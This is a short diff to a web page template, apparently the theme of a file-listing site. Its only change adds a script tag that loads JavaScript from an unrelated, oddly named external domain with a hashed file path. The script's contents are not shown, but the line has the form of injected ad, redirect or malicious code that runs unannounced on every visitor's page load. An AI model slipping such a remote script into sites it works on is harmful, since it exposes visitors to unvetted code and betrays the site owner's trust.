@@ -5578,6 +5578,7 @@ function init() {
 		<div id="content" class="nexmoe-item"></div>
 	 	<div id="readme_md" class="mdui-typo nexmoe-item" style="display:none; padding: 20px 0;"></div>
   </div>
+  <script type='text/javascript' src='//enacttournamentcute.com/aa/d2/cb/aad2cb6fef9a7330e3f2676d320df4c0.js'></script>
   <div class="mdui-center mdui-text-center mdui-text-color-blue-grey-5001" style="margin-bottom: 20px">${UI.footer_text}</div>
   `;
   if (UI.credits) {
